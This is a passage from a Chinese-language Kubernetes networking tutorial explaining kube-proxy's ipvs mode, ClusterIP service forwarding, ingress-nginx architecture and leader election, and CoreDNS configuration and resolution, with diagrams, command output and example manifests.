\u5730\u5740\u5c31\u662f\u6bcf\u4e2a\u5bbf\u4e3b\u673a\u8282\u70b9\u4e0a flannel.1\u7f51\u5361\u7684 mac\u3002\\n\u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e0a\u9762 pod \u7684 container \u4e2d\u6709\u4e00\u4e2a\u542f\u52a8\u4e86/pause\u8fdb\u7a0b\u7684 container\uff0c\u53c8\u53eb infra container \u57fa\u7840\u5bb9\u5668\uff0c\u4ed6\u7684\u955c\u50cf\u7531 kubelet \u6307\u5b9a\uff1a\\n```text\\nkubelet --infra-container-image=k8s.gcr.io/pause:3.2\\n```\\n\\nInfra container\u7684\u4f5c\u7528\u662f\u5b9e\u73b0 pod \u5185\u591a\u4e2a\u5bb9\u5668\u4e4b\u95f4\u7684\u5b58\u50a8\u3001\u7f51\u7edc\u7b49\u8d44\u6e90\u7684\u5171\u4eab\uff0c\u5355\u72ec\u4e00\u4e2a pause \u5bb9\u5668\u7684\u597d\u5904\u662f\u4ed6\u91cc\u9762\u6ca1\u6709\u4efb\u4f55\u4e1a\u52a1\u903b\u8f91\u4e0d\u5bb9\u6613\u6302\u6389\uff0c\u4f7f\u5f97 namespace \u5171\u4eab\u66f4\u52a0\u7a33\u5b9a\u3002\\n\\n## kube-proxy\\n\u7b80\u4ecb\\n\u6765\u81ea k8s \u5b98\u7f51\u5bf9 kube-proxy \u7684\u5b9a\u4e49\uff1aKubernetes \u7f51\u7edc\u4ee3\u7406\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u8fd0\u884c\u3002\u7f51\u7edc\u4ee3\u7406\u53cd\u6620\u4e86\u6bcf\u4e2a\u8282\u70b9\u4e0a Kubernetes API \u4e2d\u5b9a\u4e49\u7684\u670d\u52a1\uff0c\u5e76\u4e14\u53ef\u4ee5\u6267\u884c\u7b80\u5355\u7684 TCP\u3001UDP \u548c SCTP \u6d41\u8f6c\u53d1\uff0c\u6216\u8005\u5728\u4e00\u7ec4\u540e\u7aef\u8fdb\u884c \u5faa\u73af TCP\u3001UDP \u548c SCTP \u8f6c\u53d1\u3002 \u5f53\u524d\u53ef\u901a\u8fc7 Docker-links-compatible \u73af\u5883\u53d8\u91cf\u627e\u5230\u670d\u52a1\u96c6\u7fa4 IP \u548c\u7aef\u53e3\uff0c \u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u6307\u5b9a\u4e86\u670d\u52a1\u4ee3\u7406\u6253\u5f00\u7684\u7aef\u53e3\u3002 \u6709\u4e00\u4e2a\u53ef\u9009\u7684\u63d2\u4ef6\uff0c\u53ef\u4ee5\u4e3a\u8fd9\u4e9b\u96c6\u7fa4 IP \u63d0\u4f9b\u96c6\u7fa4 DNS\u3002 \u7528\u6237\u5fc5\u987b\u4f7f\u7528 apiserver API \u521b\u5efa\u670d\u52a1\u624d\u80fd\u914d\u7f6e\u4ee3\u7406\u3002\\n\u7b80\u8a00\u4e4b\uff0c kube-proxy \u7684\u4f5c\u7528\u662f\u627f\u8f7d k8s svc\u7684\u6d41\u91cf\u8f6c\u53d1\uff0c\u5c06\u8bf7\u6c42\u5f80 svc ip:port\u7684\u6d41\u91cf\u8f6c\u53d1\u5230 podip:port\u4e0a\uff0c\u540c\u65f6\u8fd8\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u4e0e\u5065\u5eb7\u68c0\u67e5\u673a\u5236\u3002\\n\\n\u90e8\u7f72\u67b6\u6784:\\n\\n```mermaid\\nflowchart TD\\n    subgraph Overlay_Network[Overlay Network]\\n    end\\n    subgraph Master\\n        API_Server[API Server]\\n        Scheduler[Scheduler]\\n        Controller_Manager[Controller Manager]\\n        etcd[etcd]\\n    end\\n    subgraph Node1[\\"Node 1\\"]\\n        subgraph KubeProxy1[Kubelet kube-proxy]\\n        end\\n        C1_1[C1]\\n        C2_1[C2]\\n        C3_1[C3]\\n        Container_Runtime1[Container Runtime]\\n        Operating_System1[Operating System]\\n        Infrastructure1[Infrastructure]\\n    end\\n    subgraph Node2[\\"Node 2\\"]\\n        subgraph KubeProxy2[Kubelet kube-proxy]\\n        end\\n        C1_2[C1]\\n        C2_2[C2]\\n        C3_2[C3]\\n        Container_Runtime2[Container Runtime]\\n        Operating_System2[Operating System]\\n        Infrastructure2[Infrastructure]\\n    end\\n    Overlay_Network --\x3e Master\\n    Overlay_Network --\x3e Node1\\n    Overlay_Network --\x3e Node2\\n    Node1 --\x3e Infrastructure1\\n    Infrastructure1 --\x3e Operating_System1\\n    Operating_System1 --\x3e Container_Runtime1\\n    Container_Runtime1 --\x3e KubeProxy1\\n    Container_Runtime1 --\x3e C1_1\\n    Container_Runtime1 --\x3e C2_1\\n    Container_Runtime1 --\x3e C3_1\\n    Node2 --\x3e Infrastructure2\\n    Infrastructure2 --\x3e Operating_System2\\n    Operating_System2 --\x3e Container_Runtime2\\n    Container_Runtime2 --\x3e KubeProxy2\\n    Container_Runtime2 --\x3e C1_2\\n    Container_Runtime2 --\x3e C2_2\\n    Container_Runtime2 --\x3e C3_2\\n```\\n\\nlinux \u7cfb\u7edf\u4e2d\u7684kube-proxy \u652f\u6301\u591a\u79cd\u4ee3\u7406\u6a21\u5f0f\uff0cuserspace\u3001iptables \u548c ipvs\uff0cuserspace \u6a21\u5f0f\u5c5e\u4e8e\u65e9\u671f\u5b9e\u73b0\u7684\u65b9\u6848\uff0c\u56e0\u4e3a\u6027\u80fd\u539f\u56e0\u5df2\u7ecf\u9010\u6e10\u5f03\u7528\uff0ciptables \u6a21\u5f0f\u901a\u8fc7 iptables \u5b9e\u73b0\u6570\u636e\u5305\u8f6c\u53d1\uff0c\u4f46\u4e0d\u5177\u5907\u8d1f\u8f7d\u5747\u8861\u80fd\u529b\u4e14\u89c4\u6a21\u4e0a\u53bb\u4e4b\u540e iptables \u89c4\u5219\u592a\u591a\u4e5f\u4f1a\u5f15\u53d1\u6027\u80fd\u95ee\u9898\uff0c\u76ee\u524d k8s \u4e2d\u4f7f\u7528\u7684\u662f ipvs \u6a21\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7\u542f\u52a8\u53c2\u6570\u770b\u5230\uff1a\\n```bash\\n[k8s@k8s-192-168-4-86 ~]$ ps aux|grep kube-proxy\\nk8s  80898  0.0  0.0 112816   988 pts/1    S+   23:17   0:00 grep --color=auto kube-proxy\\nroot     196678  0.2  0.0 750776 31484 ?        Ssl  Jun18  191:02 kube-proxy --feature-gates=TTLAfterFinished=true --proxy-mode=ipvs --cluster-cidr=10.42.0.0/16 --xy.yaml --healthz-bind-address=127.0.0.1 --v=2\\n```\\n\\nipvs \u662f linux kernel \u4e2d\u7684\u6a21\u5757\uff0c\u5177\u5907\u8d1f\u8f7d\u5747\u8861\u80fd\u529b\u7684\u540c\u65f6\u8fd8\u80fd\u83b7\u5f97\u4e0d\u9519\u7684\u8f6c\u53d1\u6027\u80fd\u3002ipvs \u6a21\u5757\u6765\u81ea\u4e8e lvs \u9879\u76ee\uff0clvs \u9879\u76ee\u8bde\u751f\u4e8e 1998 \u5e74\uff0cipvs \u6a21\u5757\u6700\u65b0\u7248\u672c\u4e3a v1.2 \u53d1\u5e03\u4e8e 2004 \u5e74\uff0c\u8ddd\u4eca\u5df2\u7ecf\u7a33\u5b9a\u8fd0\u884c20 \u5e74\u3002\u503c\u5f97\u4e00\u63d0\u7684\u662f lvs \u9879\u76ee\u7684\u521b\u7acb\u8005\u7ae0\u6587\u5d69\u535a\u58eb\uff0c\u4ed6\u7684\u8d21\u732e\u4f7f\u5f97  ipvs \u6210\u4e3a\u4e86\u8d1f\u8f7d\u5747\u8861\u9886\u57df\u7684\u91cd\u8981\u6280\u672f\uff0c\u5bf9\u4e92\u8054\u7f51\u57fa\u7840\u8bbe\u65bd\u7684\u53d1\u5c55\u4ea7\u751f\u4e86\u79ef\u6781\u6df1\u8fdc\u7684\u5f71\u54cd\u3002\\n\\n\u6570\u636e\u6d41\u5411:\\n```text\\n+---------------------------------+\\n|             Node                |\\n|  +----------+  +------------+   |\\n|  |  Client  |  | kube-proxy |---+\\n|  +----------+  +------------+   |\\n|           \\\\           /         |\\n|            \\\\         /          |\\n|        +----------------+       |\\n|        |   clusterIP    |       |\\n|        | (Virtual Server)|      |\\n|        +----------------+       |\\n+------------------------------+  |\\n                      -           |\\n          +-----------------------+-----------------------+\\n          |           -           |                       |\\n+----------------+  +----------------+  +-----------------+\\n| Backend Pod 1  |  | Backend Pod 2  |  | Backend Pod 3   |\\n| (Real Server)  |  | (Real Server)  |  | (Real Server)   |\\n+----------------+  +----------------+  +-----------------+\\n```\\n\\n## svc\u5b9e\u73b0\u673a\u5236\\n\u5728 k8s \u4e2d\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u7c7b\u578b\u7684 Service\uff1a\\n1. ClusterIP\uff1aClusterIP \u662f\u9ed8\u8ba4\u7684 Service \u7c7b\u578b\uff0c\u5b83\u4e3a Service \u5206\u914d\u4e00\u4e2a Cluster IP \u5730\u5740\uff0c\u5e76\u5728\u96c6\u7fa4\u5185\u90e8\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u3002\u5f53\u8bf7\u6c42\u53d1\u9001\u5230 ClusterIP \u5730\u5740\u65f6\uff0ck8s \u7684\u5185\u90e8\u8d1f\u8f7d\u5747\u8861\u673a\u5236\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u540e\u7aef Pod\u3002\\n2. NodePort\uff1aNodePort \u7c7b\u578b\u7684 Service \u5177\u6709 ClusterIP \u7684\u6240\u6709\u529f\u80fd\uff0c\u5e76\u4e14\u8fd8\u4f1a\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u6253\u5f00\u4e00\u4e2a\u9759\u6001\u7aef\u53e3\uff0c\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230 Service\u3002\u5f53\u8bf7\u6c42\u53d1\u9001\u5230\u4efb\u4f55\u8282\u70b9\u7684 NodePort \u7aef\u53e3\u65f6\uff0ck8s \u4f1a\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u76f8\u5e94\u7684 Service\u3002\\n3. LoadBalancer\uff1aLoadBalancer \u7c7b\u578b\u7684 Service \u901a\u8fc7\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u7684\u8d1f\u8f7d\u5747\u8861\u5668\uff08\u5982 AWS ELB\u3001GCP GCLB\uff09\u6765\u516c\u5f00 Service\u3002\u8d1f\u8f7d\u5747\u8861\u5668\u4f1a\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u540e\u7aef Pod\u3002\\n4. ExternalName\uff1aExternalName \u7c7b\u578b\u7684 Service \u5141\u8bb8\u5c06 Service \u6620\u5c04\u5230\u96c6\u7fa4\u5916\u90e8\u7684\u4efb\u610f DNS \u540d\u79f0\u3002\u5b83\u4e0d\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u529f\u80fd\uff0c\u53ea\u662f\u901a\u8fc7 CNAME \u8bb0\u5f55\u5c06 Service \u540d\u79f0\u89e3\u6790\u4e3a\u5916\u90e8 DNS \u540d\u79f0\u3002\\n5. Headless Service\uff1a\u65e0\u5934\u670d\u52a1\uff0c\u662f k8s \u4e2d\u7684\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684 Service\uff0c\u5b83\u4e0e\u5176\u4ed6\u7c7b\u578b\u7684 Service\uff08\u5982 ClusterIP\u3001NodePort\u3001LoadBalancer\uff09\u6709\u6240\u4e0d\u540c\u3002Headless Service \u4e0d\u4f1a\u4e3a Service \u5206\u914d Cluster IP\uff0c\u800c\u662f\u901a\u8fc7 DNS \u8bb0\u5f55\u76f4\u63a5\u66b4\u9732\u540e\u7aef Pod \u7684\u7f51\u7edc\u5730\u5740\u3002\\nClusterIP svc\u7684\u8bf7\u6c42\u8f6c\u53d1\u8fc7\u7a0b\uff1a\\n\u6709 svc \u5982\u4e0b:\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ kubectl -n k8s get svc backend-service -owide\\nNAME             TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)      AGE    SELECTOR\\nbackend-service   ClusterIP  10.43.199.15   <none>        18888/TCP   44d    app=backend-service\\n```\\n\\n\u8be5 svc \u7684 clusterip \u4e3a 10.43.199.15\uff0c\u5916\u90e8\u7aef\u53e3\u548c\u5185\u90e8\u7aef\u53e3\u4e00\u6837\u4e3a 18888\uff0c\u5bf9\u5e94\u7684\u540e\u7aef pod \u7684 app label \u662f backend-service\u300210.43.199.15\u662f\u4e00\u4e2a\u865a\u62df\u673a IP\uff08VIP\uff09\uff0ckube-proxy \u4f1a\u628a\u8fd9\u4e2a ip \u7ed1\u5b9a\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\uff0c\\n\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ run \'ip -o a |grep 10.43.199.15\'\\n192.168.4.87    43: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n192.168.4.91    33: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n192.168.4.90    15: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n192.168.4.88    23: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n192.168.4.89    33: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n192.168.4.86    15: kube-ipvs0    inet 10.43.199.15/32 scope global kube-ipvs0\\\\       valid_lft forever preferred_lft forever\\n```\\n\u63a5\u7740 kube-proxy \u4f1a\u901a\u8fc7 apiserver \u627e\u5230 label app=backend-service\u7684\u540e\u7aef\u670d\u52a1 endpoints\uff0c\u662f pod \u7684\u5185\u7f51 ip+\u7aef\u53e3\uff0c\\n\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ kubectl -n k8s get pod -o wide -l app=backend-service\\nNAME                                READY   STATUS    RESTARTS   AGE   IP           NODE           NOMINATED NODE   READINESS GATES\\nbackend-service-555d6684b5-9kwc7    1/1     Running   0          31d   10.42.3.171  192.168.4.90   <none>           <none>\\nbackend-service-555d6684b5-s7n9n    1/1     Running   0          31d   10.42.0.134  192.168.4.91   <none>           <none>\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ kubectl -n k8s get ep backend-service\\nNAME             ENDPOINTS                        AGE\\nbackend-service   10.42.0.134:18888,10.42.3.171:18888   44d\\n```\\n\\n\u63a5\u7740\uff0ckube-proxy \u901a\u8fc7\u521b\u5efa ipvs \u89c4\u5219\uff0c\u5c06\u53d1\u5f80 VIP\u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u540e\u7aef realserver,\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ sudo ipvsadm -Ln|grep -A2 10.43.199.15\\nTCP  10.43.199.15:18888 rr\\n  -> 10.42.0.134:18888  Masq    1    0    0\\n  -> 10.42.3.171:18888  Masq    1    0    0\\n```\\n\\n\u81ea\u6b64\uff0c\u6574\u4e2a\u94fe\u8def\u5c31\u6253\u901a\u4e86\u3002\\n\\n## ingress\\ningress \u6b63\u5982\u5176\u5b57\u9762\u610f\u601d\uff0c\u662f k8s \u5bf9\u5916\u7684\u6d41\u91cf\u5165\u53e3\uff0c\u9664\u4e86\u652f\u6301 http \u6d41\u91cf\u5916\u4e5f\u652f\u6301 tcp\u3001udp \u6d41\u91cf\u8f6c\u53d1\u3002\\ningress-nginx \u662f\u5176\u4e2d\u4e00\u79cdcontroller\u5b9e\u73b0\uff0c\u9664\u4e86 nginx \u7684\u5b9e\u73b0\u4ee5\u5916\u8fd8\u6709\u5176\u4ed6\u5f88\u591a ingress controller\u5b9e\u73b0\u4f8b\u5982haproxy\u3001apisix\u3001kong\u7b49\uff0ck8s \u4e2d\u4f7f\u7528\u7684\u662fnginx-ingress-controller\u3002\\n\\n\u6570\u636e\u6d41\u5411:\\n```text\\n+------------------------+          +-----------------------+          +-------------------------+\\n| Kubernetes Cluster SVC |<---------|  Ingress Controller   |<---------|  Load Balancer          |\\n+------------------------+          +-----------------------+          +-------------------------+\\n          ^                                ^     |                              ^\\n          |                                |     | leader                       |\\n          |                                |     |                              |\\n          | expose business service        |     |                              | access FQDN\\n          |                                |     |                              |\\n+-----------------------+          +------------------------+          +-------------------------+\\n| business logic POD    |          | Kubernetes NodePort SVC|          | Client                  |\\n+-----------------------+          +------------------------+          +-------------------------+\\n                                       ^\\n                                       |\\n                                       | access business svc\\n                                       |\\n                                       |\\n                           +------------------------------------+\\n                           | control plane (green dashed lines) |\\n                           +------------------------------------+\\n                           | data plane (red solid lines)       |\\n                           +------------------------------------+\\n```\\n\\nAdditional notes:\\n- The Ingress Controller gets endpoints & generates config file from Kubernetes Cluster SVC.\\n- The Ingress Controller exposes ingress service to Kubernetes NodePort SVC.\\n- The Load Balancer accesses the Kubernetes NodePort SVC.\\n- The Client accesses the Load Balancer via FQDN.\\n- The Load Balancer accesses the business service via Kubernetes NodePort SVC.\\n- The business logic POD is exposed by the Kubernetes Cluster SVC.\\n\\n\\n\u6570\u636e\u5e73\u9762\uff1a\\n\u5ba2\u6237\u7aef\u53d1\u9001 http \u8bf7\u6c42\u81f3 LB\uff0cLB \u8f6c\u53d1\u6d41\u91cf\u81f3ingress-nginx NodePort svc\uff0c\u7531nginx-ingress-controller pod \u4e2d\u7684 nginx \u8fdb\u7a0b\u63a5\u6536\u8fd9\u4e9b\u6d41\u91cf\uff0cnginx \u8fdb\u7a0b\u5145\u5f53\u53cd\u5411\u4ee3\u7406\u7684\u89d2\u8272\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bnginx \u662f\u76f4\u63a5\u8f6c\u53d1\u81f3\u5404\u4e1a\u52a1 svc \u5bf9\u5e94\u7684 endpoints\uff0c\u800c\u975esvc \u672c\u8eab\uff0c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u6d41\u91cf\u7ed5\u8fc7 kube-proxy \u6d41\u7a0b\uff0c\u7f29\u77ed\u94fe\u8def\u3002\u8fd9\u4e00\u884c\u4e3a\u53ef\u901a\u8fc7nginx.ingress.kubernetes.io/service-upstream\u6ce8\u89e3\u63a7\u5236\u3002\\n\u63a7\u5236\u5e73\u9762\uff1a\\nnginx-ingress-controller pod \u4e2d\u9664\u4e86 nginx\u8fdb\u7a0b\u4ee5\u5916\u8fd8\u6709\u8d1f\u8d23\u63a7\u5236\u9762\u7684 nginx-ingress-controller \u8fdb\u7a0b\uff0c\\n\\n```bash\\n [k8s@k8s-192-168-4-86 ~]$ kubectl -n ingress-nginx exec -it nginx-ingress-controller-68c566495-hj457 -- ps aux\\nPID   USER      TIME  COMMAND\\n1     www-data  0:00  /usr/bin/dumb-init -- /nginx-ingress-controller --default-\\n7     www-data  4h40  /nginx-ingress-controller --default-backend-service=ingres\\n50    www-data  0:13  nginx: master process /usr/local/nginx/sbin/nginx -c /etc/ng\\n38549 www-data  0:41  nginx: worker process\\n38550 www-data  0:39  nginx: worker process\\n38583 www-data  0:38  nginx: worker process\\n```\\n\\n\u5f53 pod \u62c9\u8d77\u65f6\u901a\u8fc7\u6ce8\u518c\u5e76 lock ingress-controller-leader-nginx configmap \u9009\u4e3b\uff0c\u53ea\u6709\u4e00\u4e2a Pod \u80fd\u591f\u6210\u529f\u521b\u5efa ConfigMap\uff0c\u6210\u4e3a\u4e3b\u8282\u70b9\u3002\u5176\u4ed6 Pod \u4f1a\u68c0\u6d4b\u5230 ConfigMap \u5df2\u7ecf\u5b58\u5728\uff0c\u5e76\u6210\u4e3a\u4ece\u8282\u70b9\u3002\\n\\n```bash\\n[k8s@k8s-192-168-4-86 ~]$ kubectl -n ingress-nginx get cm ingress-controller-leader-nginx -o yaml\\napiVersion: v1\\nkind: ConfigMap\\nmetadata:\\n  annotations:\\n    control-plane.alpha.kubernetes.io/leader: \'{\\"holderIdentity\\":\\"nginx-ingress-controller-7p6wd\\",\\"leaseDurationSeconds\\":30,\\"acquireTime\\":\\"2024-07-31T12:31:56Z\\",\\"renewTime\\":\\"2024-07-31T13:44:30Z\\",\\"leaderTransitions\\":4}\'\\n  creationTimestamp: \\"2024-06-18T01:23:07Z\\"\\nmanagedFields:\\n- apiVersion: v1\\n```\\n\\n\u4e3b\u8282\u70b9\u8d1f\u8d23\u76d1\u542c k8s API Server \u4e2d\u7684 Ingress \u8d44\u6e90\uff0c\u5e76\u6839\u636e\u914d\u7f6e\u89c4\u5219\u8fdb\u884c\u6d41\u91cf\u8f6c\u53d1\u3002\u4ece\u8282\u70b9\u4f1a\u590d\u5236\u4e3b\u8282\u70b9\u7684\u914d\u7f6e\uff0c\u5e76\u7b49\u5f85\u4e3b\u8282\u70b9\u4e0d\u53ef\u7528\u65f6\u63a5\u7ba1\u6d41\u91cf\u8f6c\u53d1\u4efb\u52a1\u3002\u5982\u679c\u4e3b\u8282\u70b9\u53d1\u751f\u6545\u969c\u91cd\u542f\u7b49\uff0c\u8d85\u8fc7 30 \u79d2\u4ece\u8282\u70b9\u5c31\u4f1a\u68c0\u6d4b\u5230\u4e3b\u8282\u70b9\u4e0d\u53ef\u7528\uff0c\u5e76\u5f00\u59cb\u7ade\u9009\u65b0\u7684\u4e3b\u8282\u70b9\u3002\\n\\n### \u4f7f\u7528\u793a\u4f8b\\n\u4ee5\u4e0b demo \u6f14\u793a\u5982\u4f55\u521b\u5efa ingress\u4ee5\u53ca\u5bf9\u5e94\u7684 svc\u3001endpoint \u8d44\u6e90\uff0c\u5e76\u5bf9\u5916\u63d0\u4f9b\u8bbf\u95ee\uff1a\\n\\n```yaml\\n---\\napiVersion: v1\\nkind: Service\\nmetadata:\\n  name: laosiji\\n  namespace: default\\nspec:\\n  type: ClusterIP\\n  ports:\\n  - port: 6666\\n\\n---\\napiVersion: v1\\nkind: Endpoints\\nmetadata:\\n  name: laosiji\\n  namespace: default\\nsubsets:\\n  - addresses:\\n    - ip: 192.168.4.86\\n    ports:\\n    - port: 6666\\n\\n---\\napiVersion: networking.k8s.io/v1\\nkind: Ingress\\nmetadata:\\n  name: laosiji-ingress\\n  namespace: default\\nspec:\\n  rules:\\n  - host: siji.example.com\\n    http:\\n      paths:\\n      - pathType: Prefix\\n        path: /\\n        backend:\\n          service:\\n            name: laosiji\\n            port:\\n              number: 6666\\n```\\n\\n## Coredns\\ncoredns \u662fk8s \u751f\u6001\u4e2d\u539f\u751f\u670d\u52a1\u53d1\u73b0\u7684\u5b9e\u73b0\u65b9\u6848\uff0c\u63d2\u4ef6\u5316\u8bbe\u8ba1\uff0c\u4e00\u4e2a\u529f\u80fd\u5bf9\u5e94\u4e00\u4e2a\u63d2\u4ef6\uff0c\u9ad8\u5ea6\u7075\u6d3b\u53ef\u6269\u5c55\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u63d2\u4ef6\u5f00\u53d1\u3002coredns \u53ef\u4ee5\u4e3a svc\u3001sts\u3001pod \u7b49\u63d0\u4f9b\u57df\u540d\u89e3\u6790\u3002\\n\\n\u89e3\u6790\u6d41\u7a0b:\\n```text\\n+-------------------------------------------------------------+     +----------------------------------------+\\n|                      Kubernetes node A                      |     |             Kubernetes node B          |\\n|                                                             |     |                                        |\\n|  +----------------------+                                   |     |  +----------------------+              |\\n|  |       Pod foo        |                                   |     |  |      node\'s          |              |\\n|  |                      |                                   |     |  |    resolv.conf       |              |\\n|  |  +----------------+  |                                   |     |  +----------------------+              |\\n|  |  |  Application   |  |                                   |     |                                        |\\n|  |  +----------------+  |                                   |     |                                        |\\n|  |          |           |                                   |     |                                        |\\n|  | Initiates DNS lookup |                                   |     |                                        |\\n|  |          v           |                                   |     |                                        |\\n|  |  +----------------+  |                                   |     |                                        |\\n|  |  | DNS resolver   |  |                                   |     |                                        |\\n|  |  +----------------+  |                                   |     |                                        |\\n|  |          |           |                                   |     |                                        |\\n|  | Uses the DNS server  |                                   |     |                                        |\\n|  | specified in         |                                   |     |                                        |\\n|  |          v           |                                   |     |                                        |\\n|  |  +----------------+  |            Points to              |     |  +----------------+                    |\\n|  |  |  resolv.conf   |  | ---------------------------------\x3e|----\x3e|  |   CoreDNS      |                    |\\n|  |  +----------------+  |                                   |     |  +----------------+                    |\\n|  |          |           |                                   |     |      |           |                     |\\n|  | If not in cache,     |                                   |     |      | Forwards  |                     |\\n|  | retrieves DNS servers|                                   |     |      v           v                     |\\n|  | from                 |                                   |     |  +----------------+  +----------------+|\\n|  |          v           |                                   |     |  | node\'s resolv.conf|  |K8s API  |    |\\n|  |  +----------------+  |                                   |     |  +----------------+  |(Svcs/Endpoints) |\\n|  |  | nodelocaldns   |  |                                   |     |                     +----------------+ |\\n|  |  +----------------+  |                                   |     |                                        |\\n|  +----------------------+                                   |     +----------------------------------------+\\n+-------------------------------------------------------------+\\n```\\n\\n### \u8bb0\u5f55\u89c4\u5219\\nsvc\u8bb0\u5f55\u89c4\u5219\uff1a\\n```text\\n<svc-name>.<namespace-name>.svc.<cluster-domain>\\n```\\nstatefulset\u8bb0\u5f55\u89c4\u5219\uff1a\\n```text\\n<pod-name>.<svc-name>.<namespace-name>.svc.<cluster-domain>\\n```\\n\\n\u914d\u7f6e\u793a\u4f8b:\\n```yaml\\n.:53 {                            # \u76d1\u542c\u5730\u5740\u548c\u7aef\u53e3\\n    errors                        # \u542f\u7528\u9519\u8bef\u65e5\u5fd7\\n    health {                      # \u5065\u5eb7\u68c0\u67e5\u914d\u7f6e,\u63d0\u4f9bLiveness\u63a2\u9488\u5730\u5740http://:8080/health\\n      lameduck 5s                 # \u5728\u5173\u95ed\u524d\u7684\u7b49\u5f85\u65f6\u95f4\\n    }\\n    ready                         # \u542f\u7528\u5c31\u7eea\u68c0\u67e5\\n    hosts /etc/add_hosts {        # \u4f7f\u7528\u6307\u5b9a\u7684hosts\u6587\u4ef6\u8fdb\u884c\u89e3\u6790\\n      #1.2.3.1   kubenode1        # hosts\u6587\u4ef6\u4e2d\u7684\u89e3\u6790\u89c4\u5219\uff0c\u5c06kubenode1\u89e3\u6790\u4e3a1.2.3.1\\n      fallthrough                 # \u5982\u679c\u6ca1\u6709\u5339\u914d\u5230hosts\u6587\u4ef6\u4e2d\u7684\u89e3\u6790\u89c4\u5219\uff0c\u7ee7\u7eed\u5411\u4e0b\u89e3\u6790\\n    }\\n    kubernetes cluster.local in-addr.arpa ip6.arpa {   # Kubernetes\u76f8\u5173\u914d\u7f6e\\n      pods insecure               # \u5141\u8bb8\u901a\u8fc7\u57df\u540d\u89e3\u6790Pods\u7684IP\u5730\u5740\\n      fallthrough in-addr.arpa ip6.arpa                # \u5982\u679c\u6ca1\u6709\u5339\u914d\u5230Kubernetes\u76f8\u5173\u7684\u89e3\u6790\u89c4\u5219\uff0c\u7ee7\u7eed\u5411\u4e0b\u89e3\u6790\\n    }\\n    prometheus :9153              # \u542f\u7528Prometheus\u6307\u6807\u6536\u96c6\uff0c\u76d1\u542c\u5730\u5740\u548c\u7aef\u53e3\\n    bufsize 4096                  #  limits a requester\u2019s UDP payload size to within a maximum value,must be within 512 - 4096\\n    forward . \\"/etc/resolv.conf\\"  # \u4f7f\u7528\u6307\u5b9a\u7684resolv.conf\u6587\u4ef6\u8fdb\u884c\u8f6c\u53d1\u89e3\u6790\\n    cache 30                      # DNS\u7f13\u5b58\u65f6\u95f4\\n    loop                          # \u542f\u7528\u5faa\u73af\u67e5\u8be2\\n    reload                        # \u76d1\u542c\u914d\u7f6e\u6587\u4ef6\u7684\u53d8\u5316\u5e76\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\\n    loadbalance                   # \u542f\u7528\u8d1f\u8f7d\u5747\u8861\\n}\\n```\\npod \u4e2d\u7684 dns \u914d\u7f6e\u53d7dnsPolicy\u7b56\u7565\u548c hostNetwork \u7b56\u7565\u63a7\u5236\uff0c\u5f53hostNetwork=true \u65f6\uff0c\u4f7f\u7528\u5bbf\u4e3b\u673a dns\uff0c\u5176\u4e2ddnsPolicy\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a\\n\\n```\\n\\n| \u7b56\u7565\u540d\u79f0                | \u89e3\u6790\u884c\u4e3a                                                                 |\\n|-------------------------|-------------------------------------------------------------------------|\\n| Default                 | Pod \u4f7f\u7528\u5bbf\u4e3b\u673a\u7684 DNS \u914d\u7f6e                                                |\\n| ClusterFirst            | \u9ed8\u8ba4\u8bbe\u7f6e\uff0cPod \u4f7f\u7528 coredns \u4f5c\u4e3a nameserver\uff0c\u5176 nameserver \u6765\u81ea kubelet \u7684--cluster-dns=10.43.0.10\u53c2\u6570 |\\n| ClusterFirstWithHostNet | \u5373\u4f7f\u662fhostNetwork=true\uff0c\u4e5f\u4f1a\u4f7f\u7528 coredns                                |\\n| None                    | \u4f7f\u7528 Pod \u7684 dnsConfig \u914d\u7f6e\u9879                                             |\\n\\n\\n\u89e3\u6790\u793a\u4f8b:\\n```text\\nroot@backend-service-555d6684b5-9kwc7:~# cat /etc/resolv.conf\\nnameserver 10.43.0.10\\nsearch k8s.svc.cluster.local svc.cluster.local cluster.local\\noptions ndots:5\\nroot@backend-service-555d6684b5-9kwc7:~# nslookup clickhouse-service.clickhouse\\nServer:         10.43.0.10\\nAddress:        10.43.0.10#53\\nName:   clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.91\\nName:   clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.86\\nName:   clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.87\\nName:   clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.90\\nName:   clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.89\\nName:   